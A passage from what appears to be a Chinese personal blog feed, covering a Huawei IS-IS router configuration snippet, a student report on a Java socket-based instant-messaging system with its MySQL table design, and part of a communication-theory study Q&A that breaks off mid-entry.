class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="配置R4"><a href="#配置R4" class="headerlink" title="# 配置R4"></a># 配置R4</h5><pre class="line-numbers language-华为" data-language="华为"><code class="language-华为">[R4] isis 1[R4-isis-1] is-level level-2[R4-isis-1] network-entity 20.0000.0000.0004.00[R4-isis-1] quit[R4] interface gigabitethernet0&#x2F;0&#x2F;0[R4-GigabitEthernet0&#x2F;0&#x2F;0] isis enable 1[R4-GigabitEthernet0&#x2F;0&#x2F;0] quit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;center&gt;&lt;h1&gt;中间系统到中间系统 IS-IS&lt;/h1&gt;&lt;/center&gt;
[TOC]

&lt;blockquote&gt;
&lt;p&gt;&lt;font color=&quot;blue&quot;&gt;IS-IS是ISO为CLNP[&lt;font color=&quot;black&quot;&gt;ConnectionLessNetwork</summary>
      
    
    
    
    <category term="HCIP" scheme="https://shierjinghuang.github.io/categories/HCIP/"/>
    
    
    <category term="HCIP" scheme="https://shierjinghuang.github.io/tags/HCIP/"/>
    
    <category term="IS-IS" scheme="https://shierjinghuang.github.io/tags/IS-IS/"/>
    
  </entry>
  
  <entry>
    <title>Java项目 即时通讯系统</title>
    <link href="https://shierjinghuang.github.io/2023/03/18/Java%E5%AE%9E%E8%AE%AD/"/>
    <id>https://shierjinghuang.github.io/2023/03/18/Java%E5%AE%9E%E8%AE%AD/</id>
    <published>2023-03-18T01:25:00.000Z</published>
    <updated>2023-04-09T07:30:00.136Z</updated>
    
    <content type="html"><![CDATA[<h2 id="即时通讯系统"><a href="#即时通讯系统" class="headerlink" title="即时通讯系统"></a>即时通讯系统</h2><h3 id="1-系统概述"><a href="#1-系统概述" class="headerlink" title="1  系统概述"></a>1  系统概述</h3><blockquote><p><font color=blue>即时通讯是一款基于互联网的即时通讯软件，旨在为企业提供高效、安全、便捷的沟通工具。</font></p><p>本项目是一个基于Java语言开发的企业QQ系统，是基于C/S模型实现。系统可分为两个部分，服务端和客户端。服务端的工作主要是来监听和接收来自客户端的请求，然后存储并处理客户端发来的消息，并通知客户端。而客户端的功能是能够让新用户注册，通过用户名密码登陆并且使用该系统。通过服务端和客户端的协同工作最终使用户能够使用该程序，完成用户和用户之间的沟通。</p></blockquote><h4 id="1-1-功能概述"><a href="#1-1-功能概述" class="headerlink" title="1.1 功能概述"></a>1.1 功能概述</h4><ol><li><p>好友管理：支持用户进行好友添加、好友删除、修改等操作，同时也支持用户自行注册、登录、修改个人信息等操作</p></li><li><p>群组管理：支持用户创建、删除、修改群组，同时也支持用户加入、退出、查看群组等操作</p></li><li><p>即时通讯：支持用户之间的即时聊天，同时也支持群组内的多人聊天，聊天内容可以包括文字、图片、文件、表情等</p></li><li><p>安全性保障：所有数据传输均采用加密方式，保证用户信息和聊天内容的安全性</p></li><li><p>消息推送：支持消息推送功能，当有新消息到达时，系统会及时向用户发送通知，方便用户及时查看聊天记录</p></li><li><p>日志记录：系统会记录用户的聊天记录以及操作日志，方便管理员进行管理和监控</p></li></ol><h4 id="1-2-技术概述"><a href="#1-2-技术概述" class="headerlink" title="1.2 技术概述"></a>1.2 技术概述</h4><p><strong>1.2.1 Java基础知识：包括语法、面向对象编程</strong></p><p>Java具有简单性、面向对象、分布式、健壮性、安全性、平台独立与可移植性、多线程、多线程、动态性等特点。Java可以编写桌面应用程序、Web应用程序、分布式系统和嵌入式系统应用程序等</p><p><strong>1.2.2 网络编程技术Socket</strong></p><p>在本程序中为实现客户端和服务器之间的通信，使用Socket技术，socket能够通过java程序发出请求和处理网络发过来的请求。在建立双方网络连接的时候会使用到socket套接字。当网络成功建立连接后，双方都会有一个socket的实例被建立，通过使用和操作这个实例完成各种需求。对双方的连接来说，客户端和服务端并没有什·么差别socket是平等的，它们都是通过socket的实现类和它的子类来完成的</p><p>socket分为服务端和客户端两部分，服务端主要是可以监听一个特殊的端口，它能够监听并且捕获的向这个特定的端口发出的请求，这个请求就是由客户端来发起的。当连接建立之后会产生会话，完成会话之后关闭连接。而客户端主要是发起请求，它能够向某一个特定的服务器上的一个特殊的端口发起请求，然后建立连接处理会话，会话完成后和服务端一样关闭socket。客户端并不用像服务器一样规定一个特殊的打开的端口，系统会自动分配一个能够使用的端口</p><p><strong>1.2.3 数据库java.SQL与MySQL数据库</strong></p><p>Java.SQL是Java语言中用于访问关系型数据库的API，Java.SQL API提供了一组简单易用的接口和类来访问关系型数据库，使得开发者可以方便地进行数据库操作，Java.SQL API是面向对象的，它将数据库中的数据结构映射为Java中的对象，使得开发者可以使用面向对象的方式来操作数据库，Java.SQL API支持插件式的驱动程序架构，使得开发者可以通过添加新的驱动程序来支持更多的数据库类型</p><p>MySQL是一种开源的、关系型数据库管理系统（RDBMS），它是由瑞典MySQL AB公司开发的，现在属于Oracle公司旗下产品。MySQL广泛应用于Web应用程序的开发中，是目前使用最为广泛的关系型数据库之一。其具有高性能，可扩展性、简单易用、跨平台性、可靠性，被广泛应用于各种应用程序的开发中</p><p><strong>1.2.4 前端技术java.swing与java.awt</strong></p><p>Java Swing是一组用于创建图形用户界面（GUI）的Java类库。它提供了丰富的组件和工具，可以帮助开发人员构建跨平台的GUI应用程序。ava Swing提供了许多常用的GUI组件，例如按钮、文本框、下拉列表、表格等，还提供了一些高级组件，例如树形控件、分隔面板、标签页等。Java Swing提供了多种布局管理器，例如BorderLayout、FlowLayout、GridLayout等，可以帮助开发人员快速构建复杂的GUI界面</p><p><strong>1.2.5 系统及文件流操作java.io</strong></p><p>Java的核心库java.io提供了全面的IO接口。包括：文件读写、标准设备输出等。Java中IO是以流为基础进行输入输出的，所有数据被串行化写入输出流，或者从输入流读入。支持文件输入输出、网络输入输出、内存输入输出等多种方式，可以处理各种来源的数据</p><p><strong>1.2.6 各类型数据处理java.util</strong></p><p>Java.util是Java语言中一个重要的标准库，提供了许多常用的工具类和数据结构，用于处理各种数据类型、日期、时间、集合等问题。Java.util提供了众多的数据结构，如数组、列表、队列、栈、堆、哈希表、树、图等，可以满足不同场景下的数据存储和处理需求。此外提供了Date、Calendar、DateFormat、SimpleDateFormat等类，支持日期和时间的格式化、解析、计算和比较等操作</p><p><strong>1.2.7 java.long多线程设置</strong></p><p>java.lang包中的Thread类是Java实现多线程的核心类之一。通过创建Thread对象并调用其start()方法，可以启动一个新的线程并执行其中的代码</p><p>创建了一个新的线程后，会将其作为参数传递给Thread构造函数的Runnable对象中定义的代码块作为该线程的执行内容。调用start()方法后，该线程会在后台运行并执行其中的代码。除了Thread类，java.lang包中还提供了一些其他的类和接口，如Runnable接口、ThreadGroup类等，用于实现多线程编程。通过这些类和接口，可以方便地管理和控制多个线程的执行</p><h3 id="2-系统设计"><a href="#2-系统设计" class="headerlink" title="2  系统设计"></a>2  系统设计</h3><h4 id="2-1功能设计"><a href="#2-1功能设计" class="headerlink" title="2.1功能设计"></a>2.1功能设计</h4><p>系统功能框架如图2-1所示:</p><img src="https://shierjinghuang.github.io/2023/03/18/Java实训/系统功能框架.jpg" style="zoom: 67%;" /><center>图2-1系统功能框架</center>系统使用流程如图2-1所示：<img src="https://shierjinghuang.github.io/2023/03/18/Java实训/系统使用流程.jpg" alt="img" style="zoom:67%;" /><center>图2-2系统使用流程</center>即时通讯是一款基于互联网的即时通讯系统，系统分为两个部分服务端和客户端,实现基础的注册登录、好友管理、群组管理、即时通讯、日志记录、提供安全保障功能。<p>客户端为用户提供了注册登录功能，新用户通过注册账号进入即时通讯系统，系统自动展示好友列表窗体。用户根据需求通过用户账号、用户名的搜索实现好友添加，通过查看与设置好友信息实现对好友的备注、分类与管理；用户通过群号、群名的搜索想要加入的群聊，同时用户可以选取好友创建属于自己的群聊，根据需求修改群信息实现个性化群聊。</p><p>服务端实现了三大功能，界面显示功能、业务处理功能、数据传送功能。界面显示功能通过服务端的设置把控主窗体界面显示；业务处理功能管理对应的用户线程，顺利实现用户的注册、登录与退出，依托服务器连接数据库实现聊天业务的处理，完成信息的记录与查询；数据传送功能是即时聊天系统的核心功能，实现简单信息传输的同时，支持一定大小文件与图片的传输，同时为了增加交互的趣味性，支持表情包的传输，其余功能有待开发。</p><p><strong>2.1.1 登录界面</strong></p><ol><li><p>用户登录: 对输入用户名和密码进行验证。用户输入数据，发送到指定的客户端，由客户端与其相连的数据库进行比较</p></li><li><p>注册账号: 设置用户名、昵称、手机号、所在地、年龄、性别、密码并对信息进行存储</p></li></ol><p><strong>2.1.2 主界面</strong></p><ol><li><p>好友列表: 对好友分组实现创建、修改、删除；对好友实现修改备注、查看资料、清空聊天记录、置顶聊天等功能</p></li><li><p>群组列表: 对群组实现创建、解散、修改资料等功能</p></li><li><p>其他功能: 实现用户资料修改、查找/添加群和好友、查看群/好友申请列表/修改用户密码/退出登录等功能。</p></li></ol><p><strong>2.1.3聊天界面</strong></p><ul><li>实现消息发送、图片发送、表情发送、文件发送、截图、查看聊天记录、字体设置等功能。</li></ul><h4 id="2-2数据库设计"><a href="#2-2数据库设计" class="headerlink" title="2.2数据库设计"></a>2.2数据库设计</h4><p><strong>2.2.1 实体关系设计</strong></p><p>即时通讯系统采用的是MySQL数据库，然后借助数据库可视化软MySQL workbeach 创建数据库，通过相应建表语句，最后完整的设计出系统数据库。</p><p>系统数据库表基本E-R表关系如图2-2所示。</p><p>系统数据库实体属性如图2-3、图2-4、图2-5、图2-6所示。</p><img src="https://shierjinghuang.github.io/2023/03/18/Java实训/数据库基本E-R图.jpg" style="zoom:80%;" /><center>图2-2系统E-R图</center><img src="https://shierjinghuang.github.io/2023/03/18/Java实训/用户实体.jpg" style="zoom: 80%;" /><center>图2-3用户属性图</center><img src="https://shierjinghuang.github.io/2023/03/18/Java实训/好友属性E-R图.jpg" style="zoom:80%;" /><center>图2-4好友属性图</center><img src="https://shierjinghuang.github.io/2023/03/18/Java实训/消息属性E-R图.jpg" style="zoom:67%;" /><center>图2-5消息记录属性图</center><img src="https://shierjinghuang.github.io/2023/03/18/Java实训/群属性E-R图.jpg" style="zoom:80%;" /><center>图2-6群属性图</center>**2.2.2表**<p>以下列出数据库设计过程中相关表的情况。</p><ol><li>yonghu用户信息表 :该表主要用于存储注册用户的个人账号信息，主要由账号密码、性别、年龄、昵称、电话、地址、注册日期等字段组成，其表结构如表2-1所示。</li></ol><center>表2-1 yonghu表的结构</center>|   字段名   | 数据类型 | 长度 | 是否主键 |   描述   || :--------: | :------: | ---- | :------: | :------: || yonghuming | varchar  | 200  |    是    |  用户名  ||    mima    | varchar  | 200  |    否    |   密码   ||  xingbie   | varchar  | 200  |    否    |   性别   ||  nianling  | varchar  | 200  |    否    |   年龄   ||   aihao    | varchar  | 200  |    否    |   爱好   ||    role    | varchar  | 200  |    否    |   角色   ||  nicheng   | varchar  | 200  |    否    |   昵称   ||   phone    | varchar  | 200  |    否    |   电话   ||  address   | varchar  | 200  |    否    |   地址   ||  headimg   | varchar  | 200  |    否    |   头像   || registdate | varchar  | 200  |    否    | 注册日期 |<ol start="2"><li>haoyou好友表 :该表主要用于存储用户的好友信息并记录是否置顶，好友信息主要由好友名、好友备注、昵称、归属组ID组成，其表结构主要如表2-2所示。</li></ol><center>表2-2 haoyou表的结构</center>| 字段名           | 数据类型 | 长度 | 是否主键 | 描述       || :--------------- | :------: | :--: | :------: | :--------- || id               | varchar  | 200  |    是    | 好友ID     || haoyouyonghuming | varchar  | 200  |    否    | 好友用户名 || beizhuname       | varchar  | 200  |    否    | 备注名称   || nickname         | varchar  | 200  |    否    | 昵称       || zhiding          | varchar  | 200  |    否    | 是否置顶   || fenleiid         |   int    |  10  |    否    | 归属组ID   |<ol start="3"><li>qun 群组表 :该表主要记录创建的群的群号、群名、群主、群备注以及群头像，其表结构主要如表2-3所示</li></ol><center>表2-3 qun表的结构</center>| 字段名  | 数据类型 | 长度 | 是否主键 |  描述  || :-----: | :------: | :--: | :------: | :----: || qunhao  | varchar  | 200  |    是    |  群号  || qunming | varchar  | 200  |    否    |  群名  || qunzhu  | varchar  | 200  |    否    |  群主  ||  note   | varchar  | 200  |    否    |  备注  || headimg | varchar  | 200  |    否    | 群头像 |<ol start="4"><li>qunyonghu 群用户表 :该表主要记录群用户ID、用户名，以及归属群的群号，其表结构主要如表2-4所示。</li></ol><center>表2-4 qunyonghu表的结构</center>| 字段名     | 数据类型 | 长度 | 是否主键 | 描述     || ---------- | -------- | ---- | -------- | -------- || id         | varchar  | 200  | 是       | 群用户ID || qunhao     | varchar  | 200  | 否       | 归属群号 || yonghuming | varchar  | 200  | 否       | 用户名   |<ol start="5"><li>xiaoxijilu 消息记录表 :该表主要是消息记录流，记录消息的发送方、接收方、类型、内容、大小，其表结构主要如表2-5所示</li></ol><center>表2-5 xiaoxijilu表的结构</center>| 字段名        | 数据类型 | 长度 | 是否主键 | 描述     || ------------- | -------- | ---- | -------- | -------- || id            | varchar  | 200  | 是       | 编号     || fasongren     | varchar  | 200  | 否       | 发送方   || jieshouren    | varchar  | 200  | 否       | 接收方   || neirong       | varchar  | 200  | 否       | 消息内容 || leixing       | varchar  | 200  | 否       | 消息类型 || fasongshijian | varchar  | 200  | 否       | 发送时间 || size          | varchar  | 200  | 否       | 消息大小 |<ol start="6"><li>fenlei :该表主要记录用户的所属分组，主要包括用户名、归属分组名、归属分组的ID，其表结构主要如表2-6所示</li></ol><center>表2-6 fenlei表的结构</center>| 字段名    | 数据类型 | 长度 | 是否主键 |   描述   || --------- | :------: | :--: | :------: | :------: || id        |   int    |  10  |    是    |    ID    || parentid  |   int    |  10  |    否    | 归属组ID || mingcheng | varchar  | 200  |    否    |   组名   || username  | varchar  | 200  |    否    |  用户名  |<ol start="7"><li>qiandao :该表用于记录用户的上线日期，其表结构主要如表2-7所示</li></ol><center>表2-7 qiandao表的结构</center>|   字段名    | 数据类型 | 长度 | 是否主键 |   描述   || :---------: | :------: | :--: | :------: | :------: ||     id      | varchar  | 200  |    是    |    ID    || qiandaoren  | varchar  | 200  |    否    |  用户名  || qiandaoriqi | varchar  | 200  |    否    | 上线日期 |<h3 id="3-系统实现"><a href="#3-系统实现" class="headerlink" title="3  系统实现"></a>3  系统实现</h3><h4 id="3-1登录界面"><a href="#3-1登录界面" class="headerlink" title="3.1登录界面"></a>3.1登录界面</h4><p><strong>3.1.1用户登录</strong></p><p>用户登录界面如图3-1所示。</p><img src="https://shierjinghuang.github.io/2023/03/18/Java实训/用户登录界面.png"  /><center>图3-1用户登录界面图</center>页面由swing代码设计完成，通过swing的addMouseListener鼠标点击触发器，检测各功能的使用，当用户按下登录初始化一个消息对象，Message msg=new Message(textField.getText());并指定消息对象的类型为connect，并将消息发送给客户端，并开启线程监听服务器端发送信息。<p>在服务器端有Server.Task用于处理客户端发送的各种消息，当检查到消息类型为connect，进入登录审查，检查数据库签到表，如果表项不为空，说明当前账户已经在其他设备登录，返回该用户已登录信息，防之存储用户名对应的ip 端口，并查询数据库用户表项用户是否存在和密码是否正确。</p><p>如果账户密码匹配成功则返回信息，登录成功，反之返回登录失败，客户端会通过线程监听服务器返回的信息作出相应的反馈。</p><p><strong>3.1.2注册账号</strong></p><p>注册账号界面如图3-2所示。</p><img src="https://shierjinghuang.github.io/2023/03/18/Java实训/账号注册页面.png" style="zoom:67%;" /><center>图3-2注册账号界面图</center>与登录流程类似，当用户点击注册按钮，会初始化一个消息对象，消息对象的类型字段为regist，并通过java.sql将数据存储到用户表上，此外与登录页面类似<p>另外的，在上传头像上使用java.io库中的getSelectedFile函数，在本地计算机中选取图像与头像，头像的传输与其在数据库的存储则是这一项目中较为困难的点，我们在用户表中设有headimg用于经过计算得到的存储32位的头像散列，并将其一流的形式发到对应服务器的headimg中，在用户登录时也是对应将这里的数据流发送给客户端</p><h4 id="3-2主界面"><a href="#3-2主界面" class="headerlink" title="3.2主界面"></a>3.2主界面</h4><p>即时通讯系统主界面如图3-3所示。</p><img src="https://shierjinghuang.github.io/2023/03/18/Java实训/即时通讯系统主界面.png"  /><center>图3-3主界面</center>**3.2.1好友列表**<p>分组创建功能实现如图3-4所示，修改好友备注功能实现如图3-5所示。</p><img src="https://shierjinghuang.github.io/2023/03/18/Java实训/创建图片.png" style="zoom:80%;" /><center>图3-4分组创建</center><img src="https://shierjinghuang.github.io/2023/03/18/Java实训/修改备注.png"  /><center>图3-5修改备注</center>**3.2.2群组列表**<p>创建群功能实现如图3-6所示。</p><img src="https://shierjinghuang.github.io/2023/03/18/Java实训/群聊功能实现.jpg"  /><center>图3-6群创建</center>**3.2.3其他功能**<p>添加好友功能实现如图3-7所示，添加群聊功能实现如图3-8所示，好友申请列表如图3-9所示</p><img src="https://shierjinghuang.github.io/2023/03/18/Java实训/添加好友功能实现.png" style="zoom:80%;" /><center>图3-7添加好友</center><img src="https://shierjinghuang.github.io/2023/03/18/Java实训/入群申请.png" style="zoom:80%;" /><center>图3-8申请入群</center><img src="https://shierjinghuang.github.io/2023/03/18/Java实训/好友申请列表.png"  /><center>图3-9好友申请列表</center>#### 3.3聊天界面<p>私聊聊天界面如图3-10所示，群聊聊天界面如图3-11所示</p><img src="https://shierjinghuang.github.io/2023/03/18/Java实训/私聊界面.png" style="zoom:80%;" /><center>图3-10 私聊聊天界面</center>本项目作为一个模仿QQ设计的即时通讯软件，私聊与群聊毫无疑问是程序的核心，在聊天的功能基础上我们受课程原始项目启发，实现了原有项目未能实现的字体设计，图片发送与文件发送，及表情包。表情包的本质实际为预先存储于程序文件夹下的图片与图片传输没有本质区别，在两个客户端均省去了，使用java.io库中程序寻找文件和，发送文件流的过程。<p>截图功能作为老师所提供项目本就实现的功能，在原有基础上没有做太大改动。文件传输与图片传输与用户注册或修改用户信息时头像的传输方式类似，都是同msg流实现文件在网络中传输，发送的数据会记录到数据库中，而接受放客户端在接受到想用信息后会将msg流存储与/msg文件夹下，实现了信息的本地存储。</p><h4 id="3-4数据存储实现"><a href="#3-4数据存储实现" class="headerlink" title="3.4数据存储实现"></a>3.4数据存储实现</h4><p>数据存储结果如图3-12</p><img src="https://shierjinghuang.github.io/2023/03/18/Java实训/数据存储结果.jpg" style="zoom:80%;" /><center>图3-12 数据存储结果</center>**在数据库的实现过程中具体操作如下：**<ol><li><p>获取数据库连接：使用getConnection方法加载MySQL数据库驱动程序”jdbc:mysql://“+ip+”:3306/“+ dbname +”?characterEncoding=utf-8”, username, password,并通过getConnection()方法建立数据库连接</p></li><li><p>在代码中实现创建数据库和数据表，比如createStatement().execute()方法执行创建数据库命令及getConn() .createStatement().executeUpdate()方法实现数据表创建</p></li><li><p>对建立的数据库连接进行测试Connection对象的createStatement()方法创建Statement对象，使用Statement对象执行SQL语句，通过executeQuery()方法执行查询语句</p></li><li><p>创建对象，使用userService.save()实现将各种所需数据数据记录进数据表中</p></li></ol><h3 id="4-结论"><a href="#4-结论" class="headerlink" title="4  结论"></a>4  结论</h3><p>本项目是一个基于Java的企业QQ系统，实现了用户注册、登录、添加好友、聊天等基本功能。能够完成用户日常交流的需要。</p><p>通过本项目的实践，我们深入理解了Java语言和相关技术的应用，掌握了Swing、Java SQL、Java.util、MySQL、多线程等技术的使用，提高了自己的编码能力和项目开发经验。同时，本项目也为企业内部沟通和协作提供了一种新的方式，具有一定的实际应用价值。</p><h3 id="5-源代码"><a href="#5-源代码" class="headerlink" title="5 源代码"></a>5 源代码</h3><p>怎么说呢，在实训过程中找代码学习是非常麻烦的，这里我就直接放部分找到的材料源代码的百度网盘吧……</p><blockquote><p><font color=orange>链接：<a href="https://pan.baidu.com/s/1mk02u-x_Cp-ULR5G-zkLCA?pwd=pv7m">https://pan.baidu.com/s/1mk02u-x_Cp-ULR5G-zkLCA?pwd=pv7m</a> </font ><br><font color=orange>提取码：pv7m </font></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;即时通讯系统&quot;&gt;&lt;a href=&quot;#即时通讯系统&quot; class=&quot;headerlink&quot; title=&quot;即时通讯系统&quot;&gt;&lt;/a&gt;即时通讯系统&lt;/h2&gt;&lt;h3 id=&quot;1-系统概述&quot;&gt;&lt;a href=&quot;#1-系统概述&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="个人" scheme="https://shierjinghuang.github.io/categories/%E4%B8%AA%E4%BA%BA/"/>
    
    
    <category term="Java" scheme="https://shierjinghuang.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>通信原理思考题</title>
    <link href="https://shierjinghuang.github.io/2023/03/09/%E9%80%9A%E4%BF%A1%E5%8E%9F%E7%90%86%E6%80%9D%E8%80%83%E9%A2%98/"/>
    <id>https://shierjinghuang.github.io/2023/03/09/%E9%80%9A%E4%BF%A1%E5%8E%9F%E7%90%86%E6%80%9D%E8%80%83%E9%A2%98/</id>
    <published>2023-03-09T07:25:00.000Z</published>
    <updated>2023-03-12T01:07:51.970Z</updated>
    
    <content type="html"><![CDATA[<h5 id="第一章"><a href="#第一章" class="headerlink" title="第一章"></a><strong>第一章</strong></h5><p>1-11衡量数字通信系统有效性和可靠性的性能指标有哪些?</p><blockquote><p>有效性用传输速率和频带利用率来衡量，可靠性用误码率、误信率来衡量</p></blockquote><p><font color="blue">1-12何谓是码元速率和信息速率?他们之间的关系如何?</font></p><blockquote><p>码元速率定义为单位时间里传输码元的个数，单位为波特(Baud)，信息速率定义为单位时间传输的比特数，单位是bit/s</p><p>码元速率在数值上小于等于信息速率。码元速率决定了发送信号所需的传输带宽。</p></blockquote><p>1-13何谓误码率和误信率?它们之间关系如何?</p><ul><li>误码率是指错误接收的码元数在传输总码元数中所占的比例  Pe=错误码元数/传输总码元数</li><li>误信率是指错误接收的比特数在传输总比特数中所占得比例  Pb=错误比特数/传输总比特数</li><li>它们是描述差错率的两种不同表述，在二进制中，二者数值相等</li></ul><h5 id="第二章"><a href="#第二章" class="headerlink" title="第二章"></a><strong>第二章</strong></h5><p>确知信号按照其强度可以分为能量信号和功率信号。功率信号按照其有无周期性划分，可以分为周期性信号和非周期性信号。</p><p>2-1何为确知信号?</p><blockquote><p>确知信号是指其取值在任何时间都是确定的和预知的信号</p></blockquote><p>2-2试分别说明能量信号和功率信号的特性?</p><blockquote><p>能量信号的其能量为有限的正值，但其功率等于零;功率信号其能量近似等于无穷大，其平均功率为有限值</p></blockquote><h5 id="第三章"><a href="#第三章" class="headerlink" title="第三章"></a><strong>第三章</strong></h5><p>随机过程的定义</p><p>定义一:<strong>随机过程是所有样本函数的集合</strong>，定义二:<strong>随机过程看作是在时间进程中处于不同时刻的随机变量的集合</strong></p><p>随机过程的统计特性由其分布函数或概率密度函数描述。</p><p>什么是各态历经性过程？</p><blockquote><p>随机过程中的任何一次实现都经历了随机过程的所有可能状态<font color="blue">（一个随机过程的所有样本函数都服从同一分布）</font></p></blockquote><ul><li>与平稳过程关系：具有各态历经性的过程一定是平稳随机过程，反之不一定成立</li></ul><p>3-1    何谓随机过程?它具有什么特点?</p><blockquote><p>随机过程是一类随时间随机变化的过程，他不能用确切的函数来表示。特点：1是对应不同随机试验结果的时间过程的集合，2是随机变量概念的延伸</p></blockquote><p>3-3    何谓严平稳?何谓广义平稳?他们之间的关系如何?</p><ul><li>严平稳:        若一个随机过程的统计特性与时间起点无关，时间平移不影响其任何统计特性</li><li>广义平稳:    均值与时间无关为常数，自相关函数只与时间间隔有关</li><li><font color="blue">关系:           若一个一般随机过程是严平稳随机过程，则它一定是广义平稳随机过程，反之不一定成立。若一个高斯过程，则严平稳随机过程与广义平稳随机过程等价。</font></li></ul><p>3-4    平稳过程的自相关函数有哪些性质?他与功率谱密度的关系如何?</p><pre class="line-numbers language-none"><code class="language-none">(1)平稳随机过程的自然相关函数与时间起点无关，只与时间间隔有关，而且是偶函数。(2) 平稳随机过程的功率谱密度与其自相关函数是一对傅里叶变换<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><center><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20221214235304920.png" alt="image-20221214235304920" style="zoom:50%;" /> </center><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20221214235400829.png" alt="image-20221214235400829" style="zoom:50%;" /><p>3-5    什么是高斯过程，其主要性质有哪些?</p><blockquote><p>如果随机过程的任意的n维分布均服从正态分布，则称它为正态过程或高斯过程</p></blockquote><ol><li>高斯过程的n维分布只依赖于各个随机变量的均值，方差和归一化协方差;</li><li>广义平稳的高斯过程也是严平稳;</li><li>如果高斯过程在不同时刻的取值是不相关的，那么他们也是统计独立的;</li><li>高斯过程经过线性变换后仍然是高斯过程</li></ol><p>3-12    什么是白噪声?其频谱和自相关函数有什么特点?白噪声通过理想低通或理想带通滤波器后的情况如何?</p><pre class="line-numbers language-none"><code class="language-none">(1)噪声的功率谱密度在所有与频率上均为常数则称为白噪声;(2)频谱为一常数，自相关函数只在R(0)处为0 ;(3)通过理想低通或理想带通滤波器后分别变成低通白噪声或带通白噪声<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><center><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20221214235802823.png" alt="image-20221214235802823" style="zoom:50%;" /></center>3-13    何为高斯白噪声?它的概率密度函数、功率频谱密度如何表示?<blockquote><p>如果白噪声取值的概率密度分布服从高斯分布，则称之为高斯白噪声;其概率密度函数为高斯函数，其功率谱密度为常数</p></blockquote><p>3-13补充：什么是高斯噪声?它们各有什么特点?性质？P45</p><blockquote><p>高斯噪声:概率密度函数符合正态分布的噪声。</p></blockquote><blockquote><p>高斯噪声的特点:它的n维分布仅由各随机变量的数学期望、方差和两两之间的归一化协方差函数决定。若高斯噪声是宽平稳，则也是严平稳的。若随机变量之间互不相关，则也是统计独立的</p></blockquote><center><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20221215000148202.png" alt="image-20221215000148202" style="zoom:50%;" /> <h5 id="第四章"><a href="#第四章" class="headerlink" title="第四章"></a><strong>第四章</strong></h5><p>按照传输媒质的不同分为：无线信道（自由空间或大气层）和有线信道（明线、电缆、光纤）</p><p>无线信道按照传播方式区分，包括地波、天波和视线传播三种。</p><p>有线信道分为有线电信道和有线光信道两大类</p><p>信道的数学模型分为调制信道模型和编码信道模型两类。</p><p>香农公式？<img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20221215000533207.png" alt="image-20221215000533207" style="zoom:50%;" /></p><p>4-6    何为多径效应?</p><blockquote><p>多径传播对信号的影响称为多径效应。多径传播指信号信号经过几条路径到达接收端，而且每条路径的长度（时延）和衰减都随着时间而变。</p></blockquote><p>4-8    何谓恒参信道，何谓随参信道，他们分别对信号传输有哪些主要影响?</p><pre class="line-numbers language-none"><code class="language-none">信道特性基本上不随时间变化或者变化很慢称为恒参信道;信道特性随机变化的信道称为随参信道;（乘性干扰随机变化的信道称为随参信道；乘性干扰基本保持恒定的信道称为恒参信道）恒参信道对信号传输的影响可以完全消除,而随参信道对信号传输的影响只能在统计平均的意义下消除<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>4-9    何谓加性干扰，何谓乘性干扰?</p><blockquote><p>信道中的噪声 n(t)是叠加在信号上的，而无论有无信号，噪声n(t)是始终存在的，该n(t)称加性干扰。<br>信道的作用相当于对输入信号乘一个系数k(t)，该k(t)可看作是对信号的一种干扰，k(t)称为乘性干扰。</p><blockquote><p>无论信号有无都存在的噪声称为加性干扰;随信号大小变化的干扰称为乘性千扰<del>(这个是原答案)</del></p></blockquote></blockquote><p>4-17    试述信道容量的定义?</p><blockquote><p>信道容量是指信道能够传输的最大平均信息量</p></blockquote><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20221215001532071.png" alt="image-20221215001532071" style="zoom:67%;" /> <h5 id="第五章"><a href="#第五章" class="headerlink" title="第五章"></a><strong>第五章</strong></h5><p>模拟调制分为：幅度调制和角度调制</p><ul><li><p>幅度调制包括：调幅AM、双边带DSB、单边带SSB、残留边带VSB调制</p><ul><li>所占带宽、特点、调制效率(功率利用率)</li><li>调幅AM特点：<img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20221215003003169.png" alt="image-20221215003003169" style="zoom: 33%;" /><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20221215003100632.png" alt="image-20221215003100632" style="zoom: 33%;" /></li><li>双边带DSB特点：<img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20221215003417004.png" alt="image-20221215003417004" style="zoom: 33%;" /></li><li>单边带SSB：<img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20221215003509942.png" alt="image-20221215003509942" style="zoom:33%;" /></li><li>残留边带VSB调制：<img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20221215003542088.png" alt="image-20221215003542088" style="zoom:33%;" /></li></ul><center><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20221215003706914.png" alt="image-20221215003706914" style="zoom: 33%;" /> </center><center>P122页表格</center></li><li><p>角度调制分为：调频FM和调相PM</p></li></ul><p>线性调制的通用模型：滤波法和相移法</p><p>解调方法：相干解调和非相干解调</p><p>5-1    何为调制?调制在通信系统中的作用是什么?</p><pre class="line-numbers language-none"><code class="language-none">调制:把信号转换成适合在信道中传输的形式的一种过程（按调制信号的变化规律去控制载波的某个参数的过程，书上解释）作用:频谱搬移;实现信道的多路复用;扩展信号带宽,提高系统的抗干扰能力、抗衰落能力，还可实现传输带宽与信噪比之间的互换。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>5-2    